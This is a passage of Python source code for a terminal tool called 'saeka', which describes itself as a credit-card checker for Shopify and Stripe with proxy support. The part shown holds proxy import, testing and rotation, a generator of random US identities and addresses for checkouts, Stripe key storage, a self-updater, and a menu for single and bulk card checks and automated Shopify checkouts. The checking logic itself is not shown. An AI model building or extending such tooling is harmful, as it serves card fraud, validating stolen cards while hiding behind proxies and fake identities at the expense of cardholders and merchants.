    entry = (f"{scheme}://{user}:{pwd}@{host}:{port}" if user and pwd
             else f"{scheme}://{host}:{port}")
    canon = normalize_proxy(entry)
    if not canon:
        print("  " + RD + "✗ invalid format" + RS); time.sleep(1); return
    print()
    with Spinner(f"testing {host}"):
        ok, err = test_tcp(canon, timeout=10)
    if ok:
        print("  " + G0 + "✓ reachable" + RS)
        CFG.setdefault("proxies", []).append(canon)
        save_config(CFG)
        print("  " + G0 + "✓ saved" + RS); time.sleep(0.8)
    else:
        print("  " + RD + f"✗ {err}" + RS)
        if input("  " + YL + "add anyway? (y/n) " + RS).strip().lower() == "y":
            CFG.setdefault("proxies", []).append(canon)
            save_config(CFG)
            print("  " + G0 + "✓ saved" + RS); time.sleep(0.6)

def _proxy_import():
    path = choose_file(ext=".txt", title="select proxy list")
    if not path:
        return
    imported = 0
    skipped = 0
    existing = set(CFG.get("proxies", []))
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            s = ln.strip()
            if not s or s.startswith("#"):
                continue
            canon = normalize_proxy(s)
            if canon and canon not in existing:
                CFG.setdefault("proxies", []).append(canon)
                existing.add(canon); imported += 1
            elif not canon:
                skipped += 1
    save_config(CFG)
    print()
    print(f"  {G0}imported {imported}{RS}  {YL}skipped {skipped}{RS}")
    time.sleep(1.2)

def _proxy_list(metrics):
    clear()
    proxies = CFG.get("proxies") or []
    print()
    if not proxies:
        print("  " + DM + "(no proxies)" + RS); time.sleep(1); return
    for i, p in enumerate(proxies, 1):
        canon = normalize_proxy(p) or p
        alive = metrics.is_alive(canon)
        dot = G0 + "●" + RS if alive else RD + "●" + RS
        st = metrics.get_stats(canon)
        suffix = ""
        if st["total"] > 0:
            suffix = f"  {DM}{st['success']}/{st['total']}  {st['success_rate']:.0f}%{RS}"
        print(f"  {dot}  {WH}{i:>2}.{RS} {p}{suffix}")
    print()
    input("  " + DM + "enter to continue" + RS)

def _proxy_remove():
    proxies = CFG.get("proxies") or []
    if not proxies:
        print("  " + RD + "no proxies" + RS); time.sleep(1); return
    clear()
    for i, p in enumerate(proxies, 1):
        print(f"  {WH}{i:>2}.{RS} {p}")
    print()
    try:
        idx = int(input(f"  {CY}▶ {WH}index{RS}  ").strip()) - 1
        if 0 <= idx < len(proxies):
            proxies.pop(idx)
            save_config(CFG)
            print("  " + G0 + "✓ removed" + RS); time.sleep(0.6)
    except (ValueError, KeyboardInterrupt):
        pass

def _proxy_clear(metrics):
    if input(f"  {RD}clear ALL? (y/n) {RS}").strip().lower() == "y":
        CFG["proxies"] = []
        save_config(CFG)
        print("  " + G0 + "✓ cleared" + RS); time.sleep(0.6)

def _proxy_test(metrics):
    proxies = CFG.get("proxies") or []
    if not proxies:
        print("  " + RD + "no proxies" + RS); time.sleep(1); return
    clear()
    print()
    for p in proxies:
        canon = normalize_proxy(p) or p
        with Spinner(f"testing {canon[:40]}"):
            ok, err = test_tcp(canon, timeout=8)
        if ok:
            try:
                r = requests.get("https://ipinfo.io/json",
                                 proxies=proxy_dict(canon), timeout=12)
                d = r.json()
                ip = d.get("ip", "?")
                org = (d.get("org", "?") or "")[:40]
                city = d.get("city", "")
                country = d.get("country", "")
                print(f"  {G0}✓{RS} {WH}{ip:<16}{RS} {org}")
                if city or country:
                    print(f"      {DM}{city}, {country}{RS}")
                metrics.record_success(canon)
            except Exception as e:
                print(f"  {RD}✗{RS} {p[:40]}  api: {str(e)[:40]}")
                metrics.record_fail(canon)
        else:
            print(f"  {RD}✗{RS} {p[:40]}  {err}")
            metrics.record_fail(canon, "timeout")
    print()
    input("  " + DM + "enter to continue" + RS)

def _proxy_stats(metrics):
    clear()
    proxies = CFG.get("proxies") or []
    print()
    if not proxies:
        print("  " + DM + "(no proxies)" + RS); time.sleep(1); return
    for p in proxies:
        canon = normalize_proxy(p) or p
        s = metrics.get_stats(canon)
        alive = metrics.is_alive(canon)
        status = G0 + "alive" + RS if alive else RD + "dead" + RS
        print(f"  {status}  {WH}{p}{RS}")
        if s["total"] > 0:
            print(f"          {DM}✓{s['success']:>3}  ✗{s['fail']:>3}  "
                  f"⏱{s['timeout']:>3}  rate: {s['success_rate']:5.1f}%{RS}")
    print()
    input("  " + DM + "enter to continue" + RS)

# =========================================================
#  FLOW: UPDATES
# =========================================================
def _remote_version():
    try:
        r = requests.get(GITHUB_API, timeout=8,
                         headers={"User-Agent": f"saeka/{APP_VERSION}"})
        if r.status_code != 200:
            return None
        tag = str(r.json().get("tag_name", "")).strip()
        return tag.lstrip("vV").strip() or None
    except Exception:
        return None

def flow_updates():
    clear()
    print()
    with Spinner("checking github releases", centered=True):
        remote = _remote_version()
    print()
    if not remote:
        b = Box(title="update check")
        b.add(f"  {RD}could not reach github{RS}")
        b.add(f"  {DM}repo: github.com/{GITHUB_REPO}{RS}")
        b.render()
        print()
        input("  " + DM + "enter to continue" + RS); return
    try:
        newer = Version(remote) > Version(APP_VERSION)
    except InvalidVersion:
        newer = remote != APP_VERSION
    b = Box(title="update check")
    b.add(f"  {DM}current{RS}  {WH}v{APP_VERSION}{RS}")
    b.add(f"  {DM}latest {RS}  {WH}v{remote}{RS}")
    if newer:
        b.add(f"  {YL}★ update available{RS}")
    else:
        b.add(f"  {G0}✓ up to date{RS}")
    b.render()
    print()
    if not newer:
        input("  " + DM + "enter to continue" + RS); return
    if input(f"  {YL}install saeka=={remote}? (y/n) {RS}").strip().lower() != "y":
        return
    with Spinner("installing"):
        try:
            proc = subprocess.run([sys.executable, "-m", "pip", "install",
                                   "--upgrade", "--no-cache-dir",
                                   f"saeka=={remote}"],
                                  capture_output=True, text=True, timeout=180)
            ok = proc.returncode == 0
        except Exception:
            ok = False
    if ok:
        print("  " + G0 + "✓ installed — restarting" + RS); time.sleep(1)
        try:
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception:
            pass
    else:
        print("  " + RD + "✗ install failed" + RS); time.sleep(1.2)

# =========================================================
#  FLOW: SETTINGS
# =========================================================
def flow_settings():
    while True:
        addr = CFG.get("address", {})
        filled = sum(1 for v in addr.values() if v)
        engine = "playwright" if detect_browser_engine() else "off"
        m = Menu("settings",
                 subtitle=f"address {filled}/10  ·  browser {engine}")
        m.add("1", f"storage folder     {DM}{CFG.get('storage_folder','')[:26]}{RS}",
              _settings_folder)
        m.add("2", f"address            {DM}{filled}/10{RS}", _settings_address_edit)
        m.add("3", "regenerate address (random US)", _settings_address_regen)
        m.add("4", f"headless           {DM}{CFG.get('headless', True)}{RS}",
              _settings_headless)
        m.add("5", f"timeout ms         {DM}{CFG.get('timeout_ms', 45000)}{RS}",
              _settings_timeout)
        m.add("6", f"stripe key         {DM}{'***set' if CFG.get('stripe_pk') else 'not set'}{RS}",
              _settings_stripe)
        m.add("7", "reset shopify store cache", _settings_reset_cache)
        m.add("<", "back", lambda: None)
        c = m.render()
        if c == "<" or c == "":
            return
        handlers = {"1": _settings_folder, "2": _settings_address_edit,
                    "3": _settings_address_regen, "4": _settings_headless,
                    "5": _settings_timeout, "6": _settings_stripe,
                    "7": _settings_reset_cache}
        fn = handlers.get(c)
        if fn:
            try:
                fn()
            except KeyboardInterrupt:
                print()
        else:
            print("  " + RD + "invalid" + RS)
            time.sleep(0.4)

def _settings_folder():
    clear()
    print()
    print(f"  {DM}current: {CFG.get('storage_folder','')}{RS}")
    print()
    p = input(f"  {CY}▶ {WH}new folder path{RS}  ").strip().strip('"')
    if not p:
        return
    p = os.path.expanduser(p)
    if not os.path.isabs(p):
        p = os.path.abspath(p)
    try:
        os.makedirs(p, exist_ok=True)
    except Exception as e:
        print("  " + RD + str(e) + RS); time.sleep(1); return
    CFG["storage_folder"] = p
    save_config(CFG)
    print("  " + G0 + "✓ saved" + RS); time.sleep(0.6)

def _settings_address_edit():
    clear()
    fields = [("first_name","first"),("last_name","last"),
              ("address1","address1"),("address2","address2"),
              ("city","city"),("province_code","state"),
              ("country_code","country"),("zip","zip"),
              ("phone","phone"),("email","email")]
    print()
    for k, lbl in fields:
        cur = CFG["address"].get(k, "")
        v = input(f"  {CY}▶ {WH}{lbl:<10}{DM}[{cur}]{RS}  ").strip()
        if v:
            CFG["address"][k] = v
    save_config(CFG)
    print("  " + G0 + "✓ saved" + RS); time.sleep(0.6)

def _settings_address_regen():
    a = generate_address()
    CFG["address"] = a
    save_config(CFG)
    clear()
    print()
    b = Box(title="new address")
    b.add(f"  {WH}{a['first_name']} {a['last_name']}{RS}")
    b.add(f"  {WH}{a['address1']}{RS}")
    b.add(f"  {WH}{a['city']}, {a['province_code']} {a['zip']}{RS}")
    b.add(f"  {WH}{a['country_code']}  ·  {a['phone']}{RS}")
    b.add(f"  {WH}{a['email']}{RS}")
    b.render()
    time.sleep(1.4)

def _settings_headless():
    CFG["headless"] = not CFG.get("headless", True)
    save_config(CFG)
    print(f"  {G0}headless = {CFG['headless']}{RS}"); time.sleep(0.6)

def _settings_timeout():
    print()
    try:
        t = int(input(f"  {CY}▶ {WH}timeout ms{RS}  ").strip())
        CFG["timeout_ms"] = max(10000, min(120000, t))
        save_config(CFG)
        print("  " + G0 + "✓ saved" + RS); time.sleep(0.6)
    except ValueError:
        pass

def _settings_stripe():
    print()
    print(f"  {DM}find at dashboard.stripe.com/apikeys{RS}")
    k = input(f"  {CY}▶ {WH}stripe PK {DM}(pk_...){RS}  ").strip()
    if k:
        CFG["stripe_pk"] = k
        save_config(CFG)
        print("  " + G0 + "✓ saved" + RS); time.sleep(0.6)

def _settings_reset_cache():
    if os.path.isfile(STORE_CACHE):
        try:
            os.remove(STORE_CACHE)
            print("  " + G0 + "✓ store cache cleared" + RS)
        except Exception as e:
            print("  " + RD + str(e) + RS)
    else:
        print("  " + DM + "no cache to clear" + RS)
    time.sleep(0.8)

# =========================================================
#  FLOW: ABOUT
# =========================================================
def flow_about():
    clear()
    print()
    b = Box(title="about")
    b.add(f"  {WH}saeka{RS}  {DM}v{APP_VERSION}{RS}")
    b.add(f"  {DM}cc checker · shopify · stripe · proxy{RS}")
    b.add(f"  {DM}author  {RS}{WH}kramyer / Raiii Kramyer{RS}")
    b.add(f"  {DM}repo    {RS}{WH}github.com/{GITHUB_REPO}{RS}")
    b.add(f"  {DM}stack   {RS}{WH}requests · pysocks · playwright{RS}")
    b.add(f"  {DM}theme   {RS}{WH}linux terminal — green on black{RS}")
    b.render()
    print()
    input("  " + DM + "enter to continue" + RS)

# =========================================================
#  MAIN
# =========================================================
def main():
    if not auth_gate():
        return
    startup_verify()

    while True:
        engine = detect_browser_engine()
        shopify_sub = "ready" if engine else "no browser"
        m = Menu("main menu", subtitle="v" + APP_VERSION)
        m.add("1", "single check",         flow_single_check)
        m.add("2", "bulk check",           flow_bulk_check)
        m.add("3", f"shopify browser checkout   {DM}({shopify_sub}){RS}",
              flow_shopify_browser)
        m.add("4", "proxy configuration",  flow_proxy_config)
        m.add("5", "check updates",        flow_updates)
        m.add("6", "settings",             flow_settings)
        m.add("7", "about",                flow_about)
        m.add("0", "exit",                 lambda: None)
        c = m.render()
        if c == "0":
            clear()
            print()
            print(center(G0 + "goodbye" + RS))
            print()
            return
        if c == "1":
            flow_single_check()
        elif c == "2":
            flow_bulk_check()
        elif c == "3":
            flow_shopify_browser()
        elif c == "4":
            flow_proxy_config()
        elif c == "5":
            flow_updates()
        elif c == "6":
            flow_settings()
        elif c == "7":
            flow_about()
        elif c == "<" or c == "":
            continue
        else:
            print("  " + RD + "invalid" + RS)
            time.sleep(0.4)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        show_cursor()
        clear()
        print()
        print(center(RD + "interrupted" + RS))
        print()
    except Exception as e:
        show_cursor()
        print(f"\n{RD}  fatal: {e}{RS}")
        time.sleep(2)
